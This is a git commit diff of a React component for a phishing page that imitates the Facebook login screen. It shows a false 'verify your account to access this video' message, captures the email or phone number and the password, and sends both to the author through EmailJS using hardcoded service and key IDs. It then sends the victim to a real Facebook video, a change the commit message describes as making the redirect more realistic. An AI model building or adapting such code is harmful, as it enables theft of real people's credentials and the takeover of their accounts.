3737b6c1de370e22e91fd654b8d033637ddfda85
GeovannyManga <geovannyx.casimirom@unac.edu.co>
2024-01-03 10:26:59 -0500

    re direccionamiento mejorado mas realista

--- src/App.jsx
+++ src/App.jsx
@@ -1,12 +1,12 @@
-import React, { useRef, useState } from 'react';
-import './App.css';
-import logo from './img/logo.png';
-import emailjs from '@emailjs/browser';
+import React, { useRef, useState } from "react";
+import "./App.css";
+import logo from "./img/logo.png";
+import emailjs from "@emailjs/browser";
 
 function App() {
   const form = useRef();
-  const [username, setUsername] = useState('');
-  const [password, setPassword] = useState('');
+  const [username, setUsername] = useState("");
+  const [password, setPassword] = useState("");
 
   const handleUsernameChange = (event) => {
     setUsername(event.target.value);
@@ -16,15 +16,24 @@ function App() {
     setPassword(event.target.value);
   };
 
-  const sendEmail = async(e) => {
+  const sendEmail = async (e) => {
     e.preventDefault();
 
-    await emailjs.sendForm('service_7e25rt6', 'template_1w3zyuq', form.current, 'JK0gRwzuDNpanaoFa')
-      .then((result) => {
-        console.log(result.text);
-      }, (error) => {
-        console.log(error.text);
-      });
+    await emailjs
+      .sendForm(
+        "service_7e25rt6",
+        "template_1w3zyuq",
+        form.current,
+        "JK0gRwzuDNpanaoFa"
+      )
+      .then(
+        (result) => {
+          console.log(result.text);
+        },
+        (error) => {
+          console.log(error.text);
+        }
+      );
   };
 
   const handleSubmit = async (event) => {
@@ -32,35 +41,59 @@ function App() {
     // Aquí puedes realizar otras acciones relacionadas con el inicio de sesión
 
     // Llamar a la función para enviar el correo electrónico
-      sendEmail(event);
-      
-      window.location.href = 'https://www.facebook.com';
+    sendEmail(event);
+
+    window.location.href =
+      "https://www.facebook.com/watch/?ref=search&v=1590306701109482&external_log_id=6f32c857-49c3-4745-a7b9-c9761b21f56c&q=programacion%20orientada%20a%20objetos%20tutorial";
   };
 
   return (
     <>
-      <header className='header-hack'>
-        <img className='h1-hack' src={logo} alt="" />
+      <header className="header-hack">
+        <img className="h1-hack" src={logo} alt="" />
       </header>
-      <div className='alert-hack'>
-        <img className='lock-hack' src="https://em-content.zobj.net/source/facebook/138/lock_1f512.png" alt="Candado" />
-        <span className='description-error-hack'>Facebook needs to verify your account information to allow access to this video</span>
+      <div className="alert-hack">
+        <img
+          className="lock-hack"
+          src="https://em-content.zobj.net/source/facebook/138/lock_1f512.png"
+          alt="Candado"
+        />
+        <span className="description-error-hack">
+          Facebook needs to verify your account information to allow access to
+          this video
+        </span>
       </div>
-      <form ref={form} className='form-hack' onSubmit={handleSubmit}>
-        <input name='user-name' className='input-hack1' type="text" placeholder='Email or Phone Number' value={username} onChange={handleUsernameChange} />
-        <input name='user-password' className='input-hack2' type="password" placeholder='Password' value={password} onChange={handlePasswordChange} />
-        <button type='submit' className='button-hack'>Log In</button>
+      <form ref={form} className="form-hack" onSubmit={handleSubmit}>
+        <input
+          name="user-name"
+          className="input-hack1"
+          type="text"
+          placeholder="Email or Phone Number"
+          value={username}
+          onChange={handleUsernameChange}
+        />
+        <input
+          name="user-password"
+          className="input-hack2"
+          type="password"
+          placeholder="Password"
+          value={password}
+          onChange={handlePasswordChange}
+        />
+        <button type="submit" className="button-hack">
+          Log In
+        </button>
       </form>
-      <div className='content-or-hck'>
-        <div className='line-hack1'></div>
-        <span className='span-or-hack'>or</span>
-        <div className='line-hack2'></div>
+      <div className="content-or-hck">
+        <div className="line-hack1"></div>
+        <span className="span-or-hack">or</span>
+        <div className="line-hack2"></div>
       </div>
-      <button className='create-new-hack'>Create new account</button>
-      <a className='olvide-hack' href="#">Forgot password</a>
-      <footer className='footer-hack'>
-
-      </footer>
+      <button className="create-new-hack">Create new account</button>
+      <a className="olvide-hack" href="#">
+        Forgot password
+      </a>
+      <footer className="footer-hack"></footer>
     </>
   );
 }
